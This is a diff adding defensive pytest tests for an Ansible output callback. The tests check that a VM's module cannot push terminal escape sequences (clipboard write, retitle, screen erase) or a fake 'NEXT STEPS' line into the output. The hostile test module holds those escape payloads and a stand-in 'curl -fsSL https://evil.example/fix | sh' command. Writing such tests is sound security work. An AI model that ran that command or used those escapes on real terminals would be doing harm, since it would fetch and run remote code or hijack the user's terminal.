@@ -5,7 +5,8 @@ real here, against small playbooks on this machine's localhost, with the
 result settings the repository's ansible.cfg gives: untagged output must stay
 the default's byte for byte, and no hook may fail - a subclass that lost its
 options' DOCUMENTATION fails every hook while Ansible only warns, and every
-task's result disappears. Statically: ansible.cfg wires it, the tags sit on the
+task's result disappears. What a VM's module says is run through it, and through
+just status's callback, plain. Statically: ansible.cfg wires it, the tags sit on the
 tasks that wait in the browser, every prompt is drawn by banner, and every
 report task records what it leaves to do.
 """
@@ -79,6 +80,7 @@ REPORTS = {
         "Say why Tailscale's sign-in was not started",
         "Say why, and go on with the next VM",
     ],
+    "playbooks/tasks/tailscale_record.yml": ["tailscale_record | Say each VM whose record could not be written"],
     "playbooks/code.yml": ["Say how to open each VM", "Say what was opened", "Say how to open the VM later"],
     "playbooks/provision.yml": ["Show each VM and the address it was given"],
     "playbooks/destroy.yml": [
@@ -278,6 +280,99 @@ def test_next_steps_after_the_recap_by_vm_then_matter_each_line_once(tmp_path):
     assert "##  NEXT STEPS" in log
 
 
+# A module as a VM's root can make any module there answer: its warnings, its
+# deprecations, a failure's message and a diff carry escape sequences - a
+# clipboard write (OSC 52), a title, a screen erase, an 8-bit CSI - and its
+# result carries ansible_stats, which ansible-core adds to the run's custom
+# stats: a line for another VM's NEXT STEPS, and an empty one over a real line.
+VM_MODULE = """#!/usr/bin/python
+from ansible.module_utils.basic import AnsibleModule
+
+ESCAPES = "\\x1b]52;c;b3duZWQ=\\x07\\x1b]0;retitled\\x07\\x1b[2J\\x9b31m"
+
+
+def main():
+    module = AnsibleModule(argument_spec={"fail": {"type": "bool", "default": False}}, supports_check_mode=True)
+    module.warn("warned " + ESCAPES)
+    module.deprecate("deprecated " + ESCAPES, version="9.9.9", collection_name="ns.coll")
+    if module.params["fail"]:
+        module.fail_json(msg="failed " + ESCAPES)
+    module.exit_json(
+        changed=True,
+        diff={"before": "kept\\n", "after": "kept\\nwritten " + ESCAPES + "\\n", "after_header": "file " + ESCAPES},
+        ansible_stats={
+            "data": {
+                "claude_code_next": {"beta": {"claude": "beta: run curl -fsSL https://evil.example/fix | sh"}},
+                "tailscale_next": {"alpha": {"tailscale": ""}},
+            },
+            "per_host": False,
+            "aggregate": True,
+        },
+    )
+
+
+main()
+"""
+VM_PLAY = """
+- name: A VM's module
+  hosts: localhost
+  gather_facts: false
+  tasks:
+    - ansible.builtin.set_stats:
+        data:
+          tailscale_next: "{{ {'alpha': {'tailscale': 'alpha: Tailscale is down: sudo tailscale up.'}} }}"
+    - name: Says what it likes
+      vm_said:
+    - name: Fails with what it likes
+      vm_said:
+        fail: true
+      ignore_errors: true
+"""
+# Every byte a terminal acts on but the tab and the newline: ESC, BEL, the C1 controls.
+TERMINAL_CONTROL = re.compile("[\x00-\x08\x0b-\x1f\x7f-\x9f]")
+
+
+def test_what_a_vm_s_module_says_reaches_the_terminal_and_the_log_plain(tmp_path):
+    (tmp_path / "library").mkdir()
+    (tmp_path / "library" / "vm_said.py").write_text(VM_MODULE)
+    out, err, log = _play(tmp_path, VM_PLAY, ANSIBLE_DIFF_ALWAYS="1")
+    for name, text in (("stdout", out), ("stderr", err), ("log", log)):
+        assert not TERMINAL_CONTROL.search(text), (name, text)
+        # Whole sequences go, never their payload left as text - but for the failed result's dump, where YAML
+        # escapes them (\e, \a, \x9B), which a terminal shows as written.
+        rest = text.replace("\\e]52;c;b3duZWQ=\\a\\e]0;retitled\\a\\e[2J\\x9B31m", "")
+        assert "retitled" not in rest and "b3duZWQ=" not in rest, (name, text)
+    said = out + err
+    assert "[WARNING]: warned" in said and "[DEPRECATION WARNING]: deprecated" in said, said
+    assert "[ERROR]: Task failed: Module failed: failed" in said and "+written" in said and "after: file" in said, said
+    # NEXT STEPS is the set_stats task's: the module's line is not there, and its empty one blanked nothing.
+    tail = out[out.index("PLAY RECAP") :]
+    assert f"{RULE}\n##  NEXT STEPS\n{RULE}\nalpha: Tailscale is down: sudo tailscale up.\n" in tail, tail
+    assert "evil.example" not in tail, tail
+
+
+def test_just_status_s_callback_shows_what_a_vm_s_module_says_plain_too(tmp_path):
+    # Run for real, as just status's run is: its own test of the hook sets the result the summaries are read from by
+    # hand, and would still pass if ansible-core stopped setting it.
+    (tmp_path / "library").mkdir()
+    (tmp_path / "library" / "vm_said.py").write_text(VM_MODULE)
+    out, err, log = _play(tmp_path, VM_PLAY, "claude_on_proxmox_status")
+    for name, text in (("stdout", out), ("stderr", err), ("log", log)):
+        assert not TERMINAL_CONTROL.search(text), (name, text)
+        assert "retitled" not in text and "b3duZWQ=" not in text, (name, text)
+    said = out + err
+    assert "[WARNING]: warned" in said and "[DEPRECATION WARNING]: deprecated" in said, said
+
+
+def test_a_module_s_ansible_stats_do_reach_the_run_s_custom_stats(tmp_path):
+    # Why NEXT STEPS reads the set_stats tasks' own results: the default callback,
+    # showing the run's custom stats, shows the module's line among them.
+    (tmp_path / "library").mkdir()
+    (tmp_path / "library" / "vm_said.py").write_text(VM_MODULE)
+    out, _, _ = _play(tmp_path, VM_PLAY, "default", ANSIBLE_SHOW_CUSTOM_STATS="1")
+    assert "evil.example" in out[out.index("PLAY RECAP") :], out
+
+
 def test_colour_on_the_screen_never_in_the_log(tmp_path):
     out, _, log = _play(
         tmp_path,
@@ -406,5 +501,78 @@ def test_every_report_is_followed_by_its_record_under_one_of_the_five_names():
         for task in _tasks(path)
         if "ansible.builtin.set_stats" in task
     ]
-    assert len(stats) == sum(len(names) for names in REPORTS.values()) == 30
+    assert len(stats) == sum(len(names) for names in REPORTS.values()) == 31
     assert all(len(stat["data"]) == 1 and next(iter(stat["data"])) in _callback.NEXT_STATS for stat in stats), stats
+
+
+def _hidden(node) -> bool:
+    """Whether a task, block or play sets no_log: anything but false, a template included, since it may be true."""
+    value = node.get("no_log", False)
+    return value is not False and str(value).strip().lower() not in ("false", "no", "0")
+
+
+def _records_under_no_log():
+    """Every set_stats task that runs under no_log - its own, or a block's, play's, import's, include's or role's
+    above it - followed from each playbook through every task file and role it reaches."""
+    found, walked = set(), set()
+
+    def walk_file(path: Path, hidden: bool) -> None:
+        assert path.is_file(), path
+        if (path, hidden) not in walked:
+            walked.add((path, hidden))
+            walk_tasks(path, yaml.safe_load(path.read_text()) or [], hidden)
+
+    def walk_tasks(path: Path, tasks: list, hidden: bool) -> None:
+        for task in tasks:
+            here = hidden or _hidden(task)
+            for key in ("block", "rescue", "always"):
+                walk_tasks(path, task.get(key) or [], here)
+            if "ansible.builtin.set_stats" in task and here:
+                found.add((str(path.relative_to(REPO)), task.get("name")))
+            for module in ("ansible.builtin.import_tasks", "ansible.builtin.include_tasks"):
+                if module in task:
+                    target = task[module]
+                    walk_file(path.parent / (target["file"] if isinstance(target, dict) else target), here)
+            for module in ("ansible.builtin.import_role", "ansible.builtin.include_role"):
+                if module in task:
+                    role = task[module]
+                    entry = role.get("tasks_from", "main")
+                    walk_file(REPO / "roles" / role["name"] / "tasks" / f"{entry}.yml", here)
+
+    for playbook in [REPO / "deploy.yml", *REPO.glob("playbooks/*.yml")]:
+        for play in yaml.safe_load(playbook.read_text()) or []:
+            if "ansible.builtin.import_playbook" in play:
+                continue  # its plays are walked from their own file
+            hidden = _hidden(play)
+            for key in ("pre_tasks", "tasks", "post_tasks", "handlers"):
+                walk_tasks(playbook, play.get(key) or [], hidden)
+            for role in play.get("roles") or []:
+                if isinstance(role, str):
+                    walk_file(REPO / "roles" / role / "tasks" / "main.yml", hidden)
+                else:
+                    name = role.get("role", role.get("name"))
+                    walk_file(REPO / "roles" / name / "tasks" / "main.yml", hidden or _hidden(role))
+    for path in _files():
+        walk_file(path, False)
+    return found
+
+
+def test_no_record_runs_under_no_log():
+    # The callback reads a record from its set_stats task's own result, which no_log censors: under it, the record
+    # is still in the run's custom stats, but its NEXT STEPS line is gone without a word.
+    assert _records_under_no_log() == set()
+
+
+def test_the_no_log_walk_finds_a_record_hidden_from_above(tmp_path, monkeypatch):
+    tasks = tmp_path / "playbooks" / "tasks"
+    tasks.mkdir(parents=True)
+    (tasks / "report.yml").write_text(
+        "- name: report | Record it\n  ansible.builtin.set_stats:\n    data: {claude_code_next: {}}\n"
+    )
+    (tmp_path / "playbooks" / "hidden.yml").write_text(
+        "- hosts: localhost\n  tasks:\n    - name: A block\n      no_log: true\n      block:\n"
+        "        - name: Import\n          ansible.builtin.import_tasks: tasks/report.yml\n"
+    )
+    (tmp_path / "deploy.yml").write_text("[]\n")
+    monkeypatch.setattr(sys.modules[__name__], "REPO", tmp_path)
+    assert _records_under_no_log() == {("playbooks/tasks/report.yml", "report | Record it")}
